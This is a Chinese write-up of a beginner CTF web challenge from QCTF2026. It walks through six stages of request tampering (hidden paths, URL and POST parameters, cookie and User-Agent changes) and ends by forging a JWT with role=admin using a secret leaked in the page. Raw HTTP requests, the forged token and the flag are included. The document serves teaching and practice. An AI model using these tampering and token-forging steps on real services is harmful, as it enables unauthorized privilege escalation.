---
title: webgogogo（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "1. 隐藏路径：其实用findsomething插件就可以直接找到"
collection: QCTF2026
---
# webgogogo

## 第一节：题目

纯教学web题

## 第二节：过程

六关依次是：

1. 隐藏路径：其实用findsomething插件就可以直接找到
2. URL 参数：`?QuestionCTF=1&web=1`。
3. POST 字段：字段名取的是页面上属性的值——页面上写着 **data-recipient="QuestionCTF"**，字段名就是 QuestionCTF，值是 hello_web。
4. Cookie：把初始的 taste=plain 换成 taste=good 再访问。
5. User-Agent：**QuestionCTFExplorer/1.0**。
6. JWT 重签：密钥泄在页面的 **data-practice-note="QuestionCTF-jwt-secret-2026"**，把 payload 的 role 改 admin，HMAC-SHA256 重签提交即可

最后 flag：

`flag{1e38af0b-4d33-496e-a8f5-fd2234aed736}`

## 复现
以下是BP的发包返回包的部分截图

**关卡 1 · 页面与源码**——取第一关页面，源码里的隐藏 div 给了下一关路径 **data-next="/stag32-9c37f59422750991107f17bf"**：

```http
GET /st4ge1-eaf9d724bb1c2a926baed3e3 HTTP/1.1
Host: 8080-e92715ec-4672-4fed-ad83-81c1c04aad87.challenge.ctfplus.cn
Cookie: sid=1025414b9d228bbab37ca1920fc22b18b9131263e22c2a0b94658a89ac81ccee
Connection: close

```

**关卡 2 · 地址栏的参数**

```http
GET /stag32-9c37f59422750991107f17bf?QuestionCTF=1&web=1 HTTP/1.1
Host: 8080-e92715ec-4672-4fed-ad83-81c1c04aad87.challenge.ctfplus.cn
Cookie: sid=1025414b9d228bbab37ca1920fc22b18b9131263e22c2a0b94658a89ac81ccee
Connection: close

```


**关卡 3 · 请求体里的消息**——字段名就是 data-recipient 的值：

```http
POST /sT4ge3-bad75f6c9e038928fdb9587b HTTP/1.1
Host: 8080-e92715ec-4672-4fed-ad83-81c1c04aad87.challenge.ctfplus.cn
Cookie: sid=1025414b9d228bbab37ca1920fc22b18b9131263e22c2a0b94658a89ac81ccee
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close

QuestionCTF=hello_web
```

页面里的信封写着 **data-recipient="QuestionCTF"** 和 **data-greeting="hello_web"**。

**关卡 4 · 浏览器的小饼干**：

```http
GET /5tAge4-412e208056c306ea379b9d2a HTTP/1.1
Host: 8080-e92715ec-4672-4fed-ad83-81c1c04aad87.challenge.ctfplus.cn
Cookie: sid=1025414b9d228bbab37ca1920fc22b18b9131263e22c2a0b94658a89ac81ccee; taste=good
Connection: close

```

**关卡 5 · 请求头的自我介绍User-Agent**：

```http
GET /staG35-bea39c8825bedb00263b428a HTTP/1.1
Host: 8080-e92715ec-4672-4fed-ad83-81c1c04aad87.challenge.ctfplus.cn
Cookie: sid=1025414b9d228bbab37ca1920fc22b18b9131263e22c2a0b94658a89ac81ccee; taste=good
User-Agent: QuestionCTFExplorer/1.0
Connection: close

```

**关卡 6 · 令牌与签名**——把 role 改成 admin 重签后的提交：

```http
POST /s7agE6-cb4055ce84ed299ffaa47d00 HTTP/1.1
Host: 8080-e92715ec-4672-4fed-ad83-81c1c04aad87.challenge.ctfplus.cn
Cookie: sid=1025414b9d228bbab37ca1920fc22b18b9131263e22c2a0b94658a89ac81ccee
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Connection: close

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlF1ZXN0aW9uQ1RGIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkxNTI0Mzg5LCJleHAiOjE3OTE1MzE1ODl9.8my5EfiFVsZvCCtOK7xl7ruEFWZvbjlsBvKDLTdkrbw
```

原始令牌 payload 是 `{"username":"QuestionCTF","role":"user",…}`，把 role 改 admin、其余字段不动，用便条里的密钥重算 HMAC-SHA256即可

